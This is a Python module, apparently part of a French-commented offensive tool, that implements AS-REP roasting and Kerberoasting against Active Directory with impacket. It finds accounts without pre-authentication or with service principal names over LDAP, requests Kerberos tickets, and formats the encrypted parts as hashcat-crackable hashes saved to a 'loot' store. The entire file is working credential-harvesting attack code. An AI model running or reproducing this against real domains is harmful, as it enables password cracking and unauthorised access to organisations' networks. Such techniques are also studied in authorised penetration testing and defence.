from impacket.krb5.asn1 import AS_REP, TGS_REP
from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
from impacket.krb5 import constants
from impacket.krb5.types import Principal, KerberosTime
from impacket.ldap import ldap as ldap_impacket
from pyasn1.codec.der import decoder
import datetime


class Roaster:
    """AS-REP Roasting + Kerberoasting en import direct (zéro subprocess).
    - AS-REP : users sans pre-auth (DONT_REQ_PREAUTH)
    - Kerberoast : users avec SPN (nécessite des creds valides)"""

    def __init__(self, loot):
        self.loot = loot

    # ---------- AS-REP ROASTING ----------
    def asrep_roast(self):
        """Tente l'AS-REP roast sur tous les users connus (sans creds)."""
        print(f"[*] AS-REP roasting sur {len(self.loot.users)} users...")
        for user in list(self.loot.users):
            h = self._get_asrep_hash(user)
            if h:
                self.loot.add_hash(user, h, "asrep")
                print(f"[+] AS-REP hash récupéré: {user}")

    def _get_asrep_hash(self, user):
        try:
            principal = Principal(
                user, type=constants.PrincipalNameType.NT_PRINCIPAL.value
            )
            tgt, _, _, _ = getKerberosTGT(
                principal, "", self.loot.domain,
                None, None, None, kdcHost=self.loot.dc_ip,
                requestPAC=False,
            )
            as_rep = decoder.decode(tgt, asn1Spec=AS_REP())[0]
            # Construction du format hashcat 18200
            enc = as_rep["enc-part"]
            etype = enc["etype"]
            cipher = enc["cipher"].asOctets()
            checksum = cipher[:16].hex()
            data = cipher[16:].hex()
            return f"$krb5asrep${etype}${user}@{self.loot.domain}:{checksum}${data}"
        except Exception:
            return None

    # ---------- KERBEROASTING ----------
    def kerberoast(self, user, password):
        """Nécessite des creds valides. Liste les SPN via LDAP puis
        demande un TGS pour chacun."""
        spn_users = self._get_spn_users(user, password)
        print(f"[*] {len(spn_users)} comptes kerberoastables trouvés.")

        for target_user, spn in spn_users:
            self.loot.add_spn(target_user, spn)
            h = self._get_tgs_hash(user, password, spn, target_user)
            if h:
                self.loot.add_hash(target_user, h, "tgs")
                print(f"[+] TGS hash récupéré: {target_user} ({spn})")

    def _get_spn_users(self, user, password):
        """Requête LDAP pour récupérer les comptes avec servicePrincipalName."""
        results = []
        try:
            base_dn = ",".join(
                [f"DC={p}" for p in self.loot.domain.split(".")]
            )
            conn = ldap_impacket.LDAPConnection(
                f"ldap://{self.loot.dc_ip}", base_dn, self.loot.dc_ip
            )
            conn.login(user, password, self.loot.domain, "", "")

            search_filter = (
                "(&(servicePrincipalName=*)"
                "(!(objectClass=computer))"
                "(!(samAccountName=krbtgt)))"
            )
            resp = conn.search(
                searchFilter=search_filter,
                attributes=["sAMAccountName", "servicePrincipalName"],
            )
            for item in resp:
                sam, spn = None, None
                try:
                    for attr in item["attributes"]:
                        name = str(attr["type"])
                        if name == "sAMAccountName":
                            sam = str(attr["vals"][0])
                        elif name == "servicePrincipalName":
                            spn = str(attr["vals"][0])
                    if sam and spn:
                        results.append((sam, spn))
                except Exception:
                    continue
        except Exception as e:
            print(f"[!] Erreur LDAP kerberoast: {e}")
        return results

    def _get_tgs_hash(self, user, password, spn, target_user):
        try:
            principal = Principal(
                user, type=constants.PrincipalNameType.NT_PRINCIPAL.value
            )
            tgt, cipher, _, sessionKey = getKerberosTGT(
                principal, password, self.loot.domain,
                None, None, None, kdcHost=self.loot.dc_ip,
            )
            spn_principal = Principal(
                spn, type=constants.PrincipalNameType.NT_SRV_INST.value
            )
            tgs, cipher, _, sessionKey = getKerberosTGS(
                spn_principal, self.loot.domain, self.loot.dc_ip,
                tgt, cipher, sessionKey,
            )
            tgs_rep = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
            enc = tgs_rep["ticket"]["enc-part"]
            etype = enc["etype"]
            cipher_bytes = enc["cipher"].asOctets()
            checksum = cipher_bytes[:16].hex()
            data = cipher_bytes[16:].hex()
            return (
                f"$krb5tgs${etype}$*{target_user}${self.loot.domain}"
                f"${spn}*${checksum}${data}"
            )
        except Exception as e:
            print(f"[!] Erreur TGS pour {target_user}: {e}")
            return None
